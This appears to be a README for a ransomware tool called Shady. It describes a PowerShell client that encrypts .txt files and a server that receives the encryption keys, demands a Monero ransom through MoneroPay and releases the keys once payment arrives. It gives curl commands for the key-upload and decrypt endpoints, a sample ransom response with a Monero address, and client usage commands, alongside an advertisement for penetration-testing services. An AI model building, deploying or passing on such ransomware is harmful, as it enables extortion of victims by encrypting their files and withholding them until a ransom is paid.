# Shady

Very basic ransomware implementation that encrypts files, sends encryption keys to the API server, requests Monero from the user. Uses [MoneroPay](https://gitlab.com/moneropay/moneropay) to track payments sent by the victim. Provides an endpoint for the user to download keys to decrypt their files if the payment has arrived.

>Now there's a MoneroPay powered ransomware that isn't the original Moneropay ransomware which wasn't powered by MoneroPay.\
-- crtoff

Do you need a pentest? Do you want to make sure your security tooling can effectively mitigate threats? Engage us here:

[![Digilol penetration testing services](https://kernal.eu/posts/xmpp-enumeration/digilol-pentest-banner.png)](https://www.digilol.net)

## Server
### POST /encrypt
```sh
curl -X POST http://baseurl:1337/encrypt -d "key=keystring"
```

#### Response
```
740f1fb1-c47d-4059-8104-accdc718a1b4 8BGoVn4r5mPL9qYjFmaNGyLKmVvHzQj6Z51YpPL67br9fynLsjaEG7PJaTpmjbUi7bWikXmaBTo7pWdbLo1CQMqiUFrBzPV 0.1
```

The format is as follows: [Payment ID] [Monero address] [Monero amount in float]

### GET /decrypt/{id}
```sh
curl -X GET http://baseurl:1337/decrypt/{payment_id}
```

#### Response
If the ransom was paid the response body will contain the key that will be used to decrypt the files.

### POST /callback/{id}
This endpoint is given to MoneroPay to callback.

## Client
Import as cmdlet:
```
Import-Module shady-client.ps1
```

Encrypt all files with .txt extension in the current working directory:

```
Shady-Client -Encrypt
```

Decrypt files once the ransom has been paid:
```
Shady-Client -Decrypt
```
